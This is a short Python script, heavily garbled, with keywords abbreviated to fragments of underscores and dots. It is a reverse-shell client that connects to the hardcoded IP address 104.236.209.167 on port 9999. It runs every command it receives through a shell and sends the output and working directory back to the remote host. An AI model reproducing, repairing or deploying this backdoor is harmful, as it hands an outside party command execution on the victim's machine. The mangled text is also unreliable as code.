______ so..
______ __
______ su..

s _ ?.?
host _ '104.236.209.167'
port _ 9999

s.c..((host, port))

w__ T..:
    data _ s.r..(1024)
    __ data[:2].d..("utf-8") __ 'cd':
        __.chdir(data[3:].d..("utf-8"))

    __ le.(data) > 0:
        cmd _ ?.P..(data[:].d..("utf-8"),shell_T.., s_o.._?.PIPE, stdin_?.PIPE, s_e.._?.PIPE)
        output_byte _ cmd.s_o...r.. + cmd.s_e...r..
        output_str _ st.(output_byte,"utf-8")
        currentWD _ __.getcwd + "> "
        s.s..(st..en..(output_str + currentWD))

        print(output_str)